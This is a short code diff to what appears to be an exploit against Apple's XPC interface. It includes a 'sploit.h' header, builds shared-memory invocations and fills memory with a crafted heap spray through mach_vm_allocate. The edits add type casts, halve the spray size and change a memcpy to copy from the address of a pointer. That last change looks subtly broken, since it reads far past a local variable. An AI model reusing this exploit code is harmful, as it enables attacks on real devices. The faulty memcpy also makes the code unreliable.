@@ -8,6 +8,7 @@
 #include <objc/objc.h>
 #include <mach-o/dyld_images.h>
 
+#include "sploit.h"
 
 #include "liboxpc/oxpc.h"
 #include "minibplist16.h"
@@ -101,19 +102,19 @@ build_shm_invocation(
     return NULL;
   }
   void* shm_buf = (void*)shm_addr;
-  *size = shm_size;
+  *size = (size_t)shm_size;
 
   memcpy(shm_buf, invocation_buffer, invocation_size);
   free(invocation_buffer);
 
   // create a shared memory port for that buffer
-  *shm_port = make_shared_memory_port(shm_buf, shm_size);
+  *shm_port = make_shared_memory_port(shm_buf, (size_t)shm_size);
 
   // map the memory backed by the port and flip in there:
   mach_vm_address_t mapped_buf = 0;
   err = vm_map(mach_task_self(),
                (vm_address_t*)&mapped_buf,
-               shm_size,
+               (vm_size_t)shm_size,
                0,
                1,
                *shm_port,
@@ -744,17 +745,16 @@ add_heap_spray_to_dictionary(
   oxpc_object_t dict)
 {
   void* heapspray_contents =  (void*) build_spray_page();
-  
   size_t heapspray_page_size = 0x4000;
-  size_t n_heapspray_pages = 0x200; // 0x100 works too
+  size_t n_heapspray_pages = 0x100; // 0x100 works too
   size_t full_heapspray_size = n_heapspray_pages * heapspray_page_size;
   
   kern_return_t err;
   mach_vm_address_t full_heapspray = 0;
   err = mach_vm_allocate(mach_task_self(), &full_heapspray, full_heapspray_size, 1);
-  
+
   for (size_t i = 0; i < n_heapspray_pages; i++) {
-    memcpy((void*)(full_heapspray + (i*heapspray_page_size)), heapspray_contents, heapspray_page_size);
+      memcpy((void*)(full_heapspray + (i*heapspray_page_size)), &heapspray_contents, heapspray_page_size);
   }
   
   // wrap that in an xpc data object
